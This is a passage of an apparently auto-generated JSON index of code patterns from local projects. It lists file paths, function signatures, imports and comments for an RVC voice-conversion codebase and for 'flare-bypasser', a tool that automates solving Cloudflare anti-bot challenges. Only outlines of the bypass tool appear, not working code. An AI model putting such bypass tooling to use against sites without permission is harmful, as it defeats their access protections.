      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/modules/train/extract_feature_print.py",
        "docstrings": [],
        "function_defs": [
          "def forward_dml(ctx, x, scale):",
          "def printt(strr):",
          "def readwave(wav_path, normalize=False):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import traceback",
          "from infer.lib.audio import load_audio",
          "import fairseq",
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "import torch_directml"
        ],
        "comments": [
          "# wave must be 16k, hop_size=320",
          "# HuBERT model",
          "# if hubert model is exist"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 1,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/utils.py",
        "docstrings": [],
        "function_defs": [
          "def make_padding(width, cropsize, offset):",
          "def inference(X_spec, device, model, aggressiveness, data):\n\"\"\"\ndata \uff1a dic configs\n\"\"\"",
          "def _execute(",
          "def preprocess(X_spec):"
        ],
        "class_defs": [],
        "imports": [
          "import numpy as np",
          "import torch",
          "from tqdm import tqdm"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/train/mel_processing.py",
        "docstrings": [],
        "function_defs": [
          "def dynamic_range_compression_torch(x, C=1, clip_val=1e-5):\n\"\"\"\nPARAMS\n------\nC: compression factor\n\"\"\"",
          "def dynamic_range_decompression_torch(x, C=1):\n\"\"\"\nPARAMS\n------\nC: compression factor used to compress\n\"\"\"",
          "def spectral_normalize_torch(magnitudes):",
          "def spectral_de_normalize_torch(magnitudes):",
          "def spectrogram_torch(y, n_fft, sampling_rate, hop_size, win_size, center=False):\n\"\"\"Convert waveform into Linear-frequency Linear-amplitude spectrogram.\n\nArgs:\ny             :: (B, T) - Audio waveforms\nn_fft\nsampling_rate\nhop_size\nwin_size\ncenter",
          "def spec_to_mel_torch(spec, n_fft, num_mels, sampling_rate, fmin, fmax):",
          "def mel_spectrogram_torch("
        ],
        "class_defs": [],
        "imports": [
          "import torch",
          "import torch.utils.data",
          "from librosa.filters import mel as librosa_mel_fn",
          "import logging"
        ],
        "comments": [
          "# Reusable banks",
          "# Window - Cache if needed",
          "# Padding",
          "# Complex Spectrogram :: (B, T) -> (B, Freq, Frame, RealComplex=2)",
          "# Linear-frequency Linear-amplitude spectrogram :: (B, Freq, Frame, RealComplex=2) -> (B, Freq, Frame)",
          "# MelBasis - Cache if needed",
          "# Mel-frequency Log-amplitude spectrogram :: (B, Freq=num_mels, Frame)",
          "# Linear-frequency Linear-amplitude spectrogram :: (B, T) -> (B, Freq, Frame)",
          "# Mel-frequency Log-amplitude spectrogram :: (B, Freq, Frame) -> (B, Freq=num_mels, Frame)"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/train/process_ckpt.py",
        "docstrings": [],
        "function_defs": [
          "def save_small_model(ckpt, sr, if_f0, name, epoch, version, hps):",
          "def extract_small_model(path, name, author, sr, if_f0, info, version):",
          "def change_info(path, info, name):",
          "def merge(path1, path2, alpha1, sr, f0, info, name, version):",
          "def extract(ckpt):",
          "def authors(c1, c2):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import traceback",
          "from collections import OrderedDict",
          "from time import time",
          "import torch",
          "from i18n.i18n import I18nAuto",
          "from infer.modules.vc import model_hash_ckpt, hash_id"
        ],
        "comments": [
          "# add author sign",
          "# try:"
        ],
        "type_hints": false,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/train/data_utils.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, audiopaths_and_text, hparams):",
          "def _filter(self):\n\"\"\"\nFilter text & store spec lengths\n\"\"\"",
          "def get_sid(self, sid):",
          "def get_audio_text_pair(self, audiopath_and_text):",
          "def get_labels(self, phone, pitch, pitchf):",
          "def get_audio(self, filename):",
          "def __getitem__(self, index):",
          "def __len__(self):",
          "def __init__(self, return_ids=False):",
          "def __call__(self, batch):\n\"\"\"Collate's training batch from normalized text and aduio\nPARAMS\n------\nbatch: [text_normalized, spec_normalized, wav_normalized]\n\"\"\"",
          "def __init__(self, audiopaths_and_text, hparams):",
          "def _filter(self):\n\"\"\"\nFilter text & store spec lengths\n\"\"\"",
          "def get_sid(self, sid):",
          "def get_audio_text_pair(self, audiopath_and_text):",
          "def get_labels(self, phone):",
          "def get_audio(self, filename):",
          "def __getitem__(self, index):",
          "def __len__(self):",
          "def __init__(self, return_ids=False):",
          "def __call__(self, batch):\n\"\"\"Collate's training batch from normalized text and aduio\nPARAMS\n------\nbatch: [text_normalized, spec_normalized, wav_normalized]\n\"\"\"",
          "def __init__(",
          "def _create_buckets(self):",
          "def __iter__(self):",
          "def _bisect(self, x, lo=0, hi=None):",
          "def __len__(self):"
        ],
        "class_defs": [
          "class TextAudioLoaderMultiNSFsid(torch.utils.data.Dataset):",
          "class TextAudioCollateMultiNSFsid:",
          "class TextAudioLoader(torch.utils.data.Dataset):",
          "class TextAudioCollate:",
          "class DistributedBucketSampler(torch.utils.data.distributed.DistributedSampler):"
        ],
        "imports": [
          "import os",
          "import traceback",
          "import logging",
          "import numpy as np",
          "import torch",
          "import torch.utils.data",
          "from infer.lib.train.mel_processing import spectrogram_torch",
          "from infer.lib.train.utils import load_filepaths_and_text, load_wav_to_torch"
        ],
        "comments": [
          "# Store spectrogram lengths for Bucketing",
          "# wav_length ~= file_size / (wav_channels * Bytes per dim) = file_size / (1 * 2)",
          "# spec_length = wav_length // hop_length",
          "# separate filename and text",
          "# print(123,phone.shape,pitch.shape,spec.shape)",
          "# amor",
          "# print(234,phone.shape,pitch.shape)",
          "#        audio_norm = audio / self.max_wav_value",
          "#        audio_norm = audio / np.abs(audio).max()",
          "# Right zero-pad all one-hot text sequences to max input length",
          "# dv = torch.FloatTensor(len(batch), 256)#gin=256",
          "# dv[i] = row[5]",
          "# dv",
          "# Store spectrogram lengths for Bucketing",
          "# wav_length ~= file_size / (wav_channels * Bytes per dim) = file_size / (1 * 2)",
          "# spec_length = wav_length // hop_length",
          "# separate filename and text",
          "#        audio_norm = audio / self.max_wav_value",
          "#        audio_norm = audio / np.abs(audio).max()",
          "# Right zero-pad all one-hot text sequences to max input length",
          "# deterministically shuffle based on epoch",
          "# add extra samples to make it evenly divisible",
          "# subsample",
          "# batching"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 10,
        "error_handling": 4,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/train/utils.py",
        "docstrings": [],
        "function_defs": [
          "def load_checkpoint(checkpoint_path, model, optimizer=None, load_opt=1):",
          "def save_checkpoint(model, optimizer, learning_rate, iteration, checkpoint_path):",
          "def summarize(",
          "def latest_checkpoint_path(dir_path, regex=\"G_*.pth\"):",
          "def plot_spectrogram_to_numpy(spectrogram):",
          "def plot_alignment_to_numpy(alignment, info=None):",
          "def load_wav_to_torch(full_path):",
          "def load_filepaths_and_text(filename, split=\"|\"):",
          "def get_hparams(init=True):\n\"\"\"\ntodo:\n\u7ed3\u5c3e\u4e03\u4eba\u7ec4\uff1a\n\u4fdd\u5b58\u9891\u7387\u3001\u603bepoch                     done\nbs                                    done\npretrainG\u3001pretrainD                  done\n\u5361\u53f7\uff1aos.en[\"CUDA_VISIBLE_DEVICES\"]   done\nif_latest                             done\n\u6a21\u578b\uff1aif_f0                             done",
          "def get_logger(model_dir, filename=\"train.log\"):",
          "def __init__(self, **kwargs):",
          "def keys(self):",
          "def items(self):",
          "def values(self):",
          "def copy(self):",
          "def __len__(self):",
          "def __getitem__(self, key):",
          "def __setitem__(self, key, value):",
          "def __contains__(self, key):",
          "def __repr__(self):"
        ],
        "class_defs": [
          "class HParams:"
        ],
        "imports": [
          "import argparse",
          "import glob",
          "import json",
          "import logging",
          "import os",
          "import sys",
          "from copy import deepcopy",
          "import codecs",
          "import numpy as np",
          "import torch",
          "from scipy.io.wavfile import read",
          "import matplotlib.pylab as plt",
          "import matplotlib",
          "import matplotlib"
        ],
        "comments": [
          "# logger.info(traceback.format_exc())",
          "#   try:",
          "#   except:",
          "#     traceback.print_exc()"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/train/losses.py",
        "docstrings": [],
        "function_defs": [
          "def feature_loss(fmap_r, fmap_g):",
          "def discriminator_loss(disc_real_outputs, disc_generated_outputs):",
          "def generator_loss(disc_outputs):",
          "def kl_loss(z_p, logs_q, m_p, logs_p, z_mask):\n\"\"\"\nz_p, logs_q: [b, h, t_t]\nm_p, logs_p: [b, h, t_t]\n\"\"\""
        ],
        "class_defs": [],
        "imports": [
          "import torch"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/layers_123821KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/nets_537238KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import numpy as np",
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_537238KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/spec_utils.py",
        "docstrings": [],
        "function_defs": [
          "def crop_center(h1, h2):",
          "def split_lr_waves(wave, mid_side=False, mid_side_b2=False, reverse=False):",
          "def run_librosa_stft(wv, n_fft, hop_length, reverse):",
          "def wave_to_spectrogram_mt(",
          "def combine_spectrograms(specs, mp):",
          "def mask_silence(mag, ref, thres=0.2, min_range=64, fade_size=32):",
          "def run_librosa_istft(specx, hop_length):",
          "def spectrogram_to_wave(spec, hop_length, mid_side, mid_side_b2, reverse):",
          "def cmb_spectrogram_to_wave(spec_m, mp, extra_bins_h=None, extra_bins=None):",
          "def fft_lp_filter(spec, bin_start, bin_stop):",
          "def fft_hp_filter(spec, bin_start, bin_stop):",
          "def mirroring(a, spec_m, input_high_end, pre_filter_start):"
        ],
        "class_defs": [],
        "imports": [
          "from concurrent.futures import ThreadPoolExecutor",
          "import math",
          "import librosa",
          "import numpy as np",
          "from numba import jit"
        ],
        "comments": [
          "# s_freq = (h2_shape[2] - h1_shape[2]) // 2",
          "# e_freq = s_freq + h1_shape[2]",
          "# lowpass fiter",
          "# wave = librosa.core.resample(wave2, bp['sr'], sr, res_type=\"sinc_fastest\")"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 3,
        "decorators": [
          "@jit(nopython=True)",
          "@jit(nopython=True)",
          "@jit(nopython=True)"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/nets_123821KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_123821KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/layers_33966KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16, 32, 64), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/nets_33966KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, ch, dilations=(4, 8, 16, 32)):",
          "def __call__(self, x):",
          "def __init__(self, n_fft):",
          "def forward(self, x, aggressiveness=None):",
          "def predict(self, x_mag, aggressiveness=None):"
        ],
        "class_defs": [
          "class BaseASPPNet(nn.Module):",
          "class CascadedASPPNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers_33966KB as layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/layers_537238KB.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def __call__(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def __call__(self, x):",
          "def __init__(",
          "def __call__(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 16, 32, 64), activ=nn.ReLU):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class SeperableConv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/layers.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, dilation=1, activ=nn.ReLU):",
          "def forward(self, x):",
          "def __init__(self, nin, nout, ksize=3, stride=1, pad=1, activ=nn.LeakyReLU):",
          "def forward(self, x):",
          "def __init__(",
          "def forward(self, x, skip=None):",
          "def __init__(self, nin, nout, dilations=(4, 8, 12), activ=nn.ReLU, dropout=False):",
          "def forward(self, x):",
          "def __init__(self, nin_conv, nin_lstm, nout_lstm):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class Conv2DBNActiv(nn.Module):",
          "class Encoder(nn.Module):",
          "class Decoder(nn.Module):",
          "class ASPPModule(nn.Module):",
          "class LSTMModule(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import spec_utils"
        ],
        "comments": [
          "# self.conv2 = Conv2DBNActiv(nout, nout, ksize, 1, pad, activ=activ)",
          "# h = self.conv2(h)"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@torch.inference_mode()",
          "@torch.inference_mode()",
          "@torch.inference_mode()",
          "@torch.inference_mode()",
          "@torch.inference_mode()"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/model_param_init.py",
        "docstrings": [],
        "function_defs": [
          "def int_keys(d):",
          "def __init__(self, config_path=\"\"):"
        ],
        "class_defs": [
          "class ModelParameters(object):"
        ],
        "imports": [
          "import json",
          "import os",
          "import pathlib",
          "import zipfile"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/infer/lib/uvr5_pack/lib_v5/nets.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(",
          "def forward(self, x):",
          "def __init__(self, n_fft, nout=32, nout_lstm=128):",
          "def forward(self, x):"
        ],
        "class_defs": [
          "class BaseNet(nn.Module):",
          "class CascadedNet(nn.Module):"
        ],
        "imports": [
          "import torch",
          "import torch.nn.functional as F",
          "from torch import nn",
          "from . import layers"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": [
          "@torch.inference_mode()",
          "@torch.inference_mode()"
        ]
      },
      {
        "file": "/Users/davidquinton/Projects/SAM/voice/rvc/rvc/layers/transforms.py",
        "docstrings": [],
        "function_defs": [
          "def piecewise_rational_quadratic_transform(",
          "def searchsorted(bin_locations, inputs, eps=1e-6):",
          "def unconstrained_rational_quadratic_spline(",
          "def rational_quadratic_spline("
        ],
        "class_defs": [],
        "imports": [
          "from typing import Optional",
          "import numpy as np",
          "import torch",
          "from torch.nn import functional as F"
        ],
        "comments": [],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": []
      }
    ],
    "rust_patterns": [],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser",
    "name": "flare-bypasser",
    "languages": [
      "Python"
    ],
    "python_patterns": [
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/setup.py",
        "docstrings": [],
        "function_defs": [
          "def is_installed(pkgname):"
        ],
        "class_defs": [],
        "imports": [
          "import sys",
          "import os",
          "import importlib",
          "import distutils.core"
        ],
        "comments": [
          "# Trick for avoid installation of non pip installed packages (apt), available by ADDITIONAL_PYTHONPATH",
          "# 'websockets @ git+https://github.com/yoori/websockets.git@main',",
          "# 'zendriver_flare_bypasser==0.2.7',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@debug4',",
          "# 'zendriver_flare_bypasser @ git+https://github.com/yoori/zendriver.git@flare-bypasser-test',",
          "# Server dependecies"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 2,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/utils/checkbox_recognizer.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import sys",
          "import logging",
          "import argparse",
          "import cv2",
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/utils/linux_chrome_archive_installer.py",
        "docstrings": [],
        "function_defs": [
          "def fetch_package(download_url):",
          "def unzip_package(",
          "def download_and_install(version_prefix = None, install_root = None, arch = 'x86_64'):"
        ],
        "class_defs": [],
        "imports": [
          "import os",
          "import sys",
          "import shutil",
          "import logging",
          "import json",
          "import zipfile",
          "import argparse",
          "from urllib.request import urlretrieve, urlopen"
        ],
        "comments": [
          "# Script can install chrome only on linux platforms and only on x86_64.",
          "# here no archive of versions for linux/arm64",
          "# If version is undefined: use max_version"
        ],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 6,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/utils/drission_page_solver/drission_page_solver.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, driver: ChromiumPage, max_retries=-1, log=True):",
          "def search_recursively_shadow_root_with_iframe(self, ele):",
          "def search_recursively_shadow_root_with_cf_input(self, ele):",
          "def locate_cf_button(self):",
          "def log_message(self, message):",
          "def click_verification_button(self):",
          "def is_bypassed(self):",
          "def bypass(self):",
          "def bypass_cloudflare(url: str, retries: int, log: bool, proxy: str = None) -> ChromiumPage:",
          "def main():"
        ],
        "class_defs": [
          "class CloudflareBypasser:"
        ],
        "imports": [
          "import sys",
          "import logging",
          "import time",
          "import numpy as np",
          "import argparse",
          "import cv2",
          "from pyvirtualdisplay import Display",
          "from DrissionPage import ChromiumPage, ChromiumOptions, WebPage"
        ],
        "comments": [
          "# If the button is not found, search it recursively",
          "# Start Xvfb for Docker"
        ],
        "type_hints": true,
        "f_strings": true,
        "list_comprehensions": 0,
        "error_handling": 7,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/tests/unit_tests/proxy_controller_test.py",
        "docstrings": [],
        "function_defs": [
          "def test_two_different_proxies_rent():",
          "def test_two_equal_proxies_rent():"
        ],
        "class_defs": [],
        "imports": [
          "from flare_bypasser import ProxyController"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/__init__.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [],
        "imports": [
          "import importlib.metadata",
          "from .flare_bypasser import Request, Response, Solver, BrowserWrapper, BaseCommandProcessor",
          "from .proxy_controller import ProxyController",
          "from .flare_bypass_server import server, server_run",
          "from .async_client import AsyncClient"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/async_client.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, solver_url, *args, **kwargs):",
          "def http_client(self) -> httpx.AsyncClient:",
          "def _init_client(self):"
        ],
        "class_defs": [
          "class AsyncClient(object):",
          "class Exception(Exception):",
          "class CloudFlareBlocked(Exception):"
        ],
        "imports": [
          "import typing",
          "import copy",
          "import json",
          "import re",
          "import httpx"
        ],
        "comments": [
          "# < base user-agent that will be used before first challenge solve,",
          "# after it will be replaced with solver actual user-agent",
          "# request web page",
          "# check that it is cloud flare unsolvable block",
          "# check that it is cloud flare block",
          "# c is http.cookiejar.Cookie",
          "# < use for solve original client cookies,",
          "# it can contains some required information other that cloud flare marker.",
          "# Update _http_client cookies"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 4,
        "decorators": [
          "@property"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/browser_wrapper.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, center):",
          "def __init__(self, page: zendriver.Tab, center_coords):",
          "def _make_attrs(self):  # override for exclude exception on __init__",
          "def __init__(",
          "def __del__(self):",
          "def start_xvfb_display():",
          "def get_driver(self) -> zendriver.Tab:",
          "def _parse_call(task):"
        ],
        "class_defs": [
          "class BrowserWrapper(object):",
          "class FakePosition(object):",
          "class FakeNode(object):",
          "class FakeElement(zendriver.Element):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import typing",
          "import asyncio",
          "import uuid",
          "import shutil",
          "import logging",
          "import time",
          "import cv2",
          "import zendriver_flare_bypasser as zendriver",
          "from xvfbwrapper import Xvfb"
        ],
        "comments": [
          "# < zendriver expect here only json serializable types",
          "# Attributes for working __repr__:",
          "# overrides for call only cdp click send in zendriver.Element.mouse_click",
          "# \"--disable-software-rasterizer\",",
          "# Disable certificates checking",
          "# browser_args += [\"--ignore-certificate-errors\", \"--ignore-urlfetcher-cert-requests\"]",
          "# Get original driver page impl - can be used only in user command specific implementations",
          "# return (title, loaded flag)",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# < zendriver timeout on element waiting",
          "# external timeout: page isn't loaded",
          "# < Select without waiting.",
          "# DOM tree changed in runtime",
          "# Ignore \"DOM agent isn't enabled\" on DOM.disable",
          "# we work only with one page - close all tabs (excluding first - this close browser)",
          "# Specific workaround for zendriver",
          "# click by coordinates without no driver patching.",
          "# convert {\"name\": \"...\", \"value\": \"...\", ...} to array of http.cookiejar.Cookie",
          "# < self._zendriver_driver.cookies.set_all(set_cookies)",
          "# return list of dict have format: {\"name\": \"...\", \"value\": \"...\"}",
          "# < self._zendriver_driver.cookies.get_all(requests_cookie_format=True)",
          "# convert array of http.cookiejar.Cookie to expected cookie format",
          "# Wrap call that allow to repeat driver call after timeout_step",
          "# Used as workaround for case when chrome don't response on CDP request",
          "# Can be disabled by enable_lost_cdp_workaround flag",
          "# for understand why we pass lambda to _deffered_call, see _deffered_call description",
          "# handle exceptions like: TypeError: target must be set to a 'TargetInfo' but got 'NoneType",
          "# it can appears in zendriver.connection.update_target on all operations,",
          "# (as result of runtime DOM changes or on page loading)",
          "# task is function, that will return coro, this allow to",
          "# avoid \"coroutine ... was never awaited\" warning",
          "# (we create coro only before it await)",
          "# wait first task canceled for get stack in exception"
        ],
        "type_hints": true,
        "f_strings": false,
        "list_comprehensions": 1,
        "error_handling": 25,
        "decorators": [
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod",
          "@staticmethod"
        ]
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/example_command_processor.py",
        "docstrings": [],
        "function_defs": [],
        "class_defs": [
          "class ExampleCommandProcessor(flare_bypasser.BaseCommandProcessor):"
        ],
        "imports": [
          "import flare_bypasser"
        ],
        "comments": [],
        "type_hints": false,
        "f_strings": false,
        "list_comprehensions": 0,
        "error_handling": 0,
        "decorators": []
      },
      {
        "file": "/Volumes/#1/Archives_and_Backups/docker-media-backup/flare-bypasser/src/flare_bypasser/flare_bypass_server.py",
        "docstrings": [],
        "function_defs": [
          "def __init__(self, app):",
          "def parse_class_command_processors(custom_command_processors_str: str):",
          "def parse_entrypoint_command_processors(extension: str):",
          "def parse_solve_forks(solve_forks: str):",
          "def init_args_parser():",
          "def init_extensions(args):",
          "def server_run():"
        ],
        "class_defs": [
          "class RemoveContentTypeRequirementMiddleware(object):",
          "class ProxyModel(pydantic.BaseModel):",
          "class CookieModel(pydantic.BaseModel):",
          "class DefferedForksModel(pydantic.BaseModel):",
          "class HandleCommandResponseSolution(pydantic.BaseModel):",
          "class HandleCommandResponse(pydantic.BaseModel):"
        ],
        "imports": [
          "import os",
          "import sys",
          "import re",
          "import typing",
          "import typing_extensions",
          "import datetime",
          "import copy",
          "import platform",
          "import uuid",
          "import pathlib",
          "import asyncio",
          "import traceback",
          "import importlib",
          "import logging",
          "import argparse",
          "import urllib3.util",
          "import fastapi",
          "import pydantic",
          "import flare_bypasser",
          "import gunicorn.app.wsgiapp",
          "import uvicorn.main"
        ],
        "comments": [
          "# Remove requirement for Content-Type header presence.",
          "# Unexpected headers format - don't make something.",
          "# Adapt proxy format for canonical representation.",
          "# < solve_response can't be None if no return_condition passed to wait_first_non_exception,",
          "# only exception expected",
          "# < pass cookies as dict's (solver don't know about rest model).",
          "# Endpoint compatible with flaresolverr API.",
          "# REST API concept methods.",
          "# postDataContentType: typing_extensions.Annotated[",
          "#   str,",
          "#   fastapi.Body(description=\"Content-Type that will be sent.\")",
          "#   ]='',",
          "# 'postDataContentType': postDataContentType,",
          "# < parse for pass to gunicorn as is and as \"--host X --port X\" to uvicorn",
